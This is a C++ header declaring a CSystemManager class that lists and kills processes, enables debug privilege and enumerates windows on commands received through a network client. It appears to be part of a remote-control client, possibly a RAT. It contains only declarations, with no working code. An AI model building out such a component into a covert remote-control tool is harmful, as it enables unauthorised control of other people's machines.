// SystemManager.h: interface for the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSTEMMANAGER_H__38ABB010_F90B_4AE7_A2A3_A52808994A9B__INCLUDED_)
#define AFX_SYSTEMMANAGER_H__38ABB010_F90B_4AE7_A2A3_A52808994A9B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "IOCPClient.h"

class CSystemManager : public CManager  
{
public:
	CSystemManager(IOCPClient* ClientObject,BOOL bHow);
	virtual ~CSystemManager();
	LPBYTE GetProcessList();
	VOID SendProcessList();
	BOOL DebugPrivilege(const char *szName, BOOL bEnable);
	VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);
	VOID KillProcess(LPBYTE szBuffer, UINT ulLength);
	LPBYTE GetWindowsList();
	static BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam);
	void SendWindowsList();
	void TestWindow(LPBYTE szBuffer);
};

#endif // !defined(AFX_SYSTEMMANAGER_H__38ABB010_F90B_4AE7_A2A3_A52808994A9B__INCLUDED_)
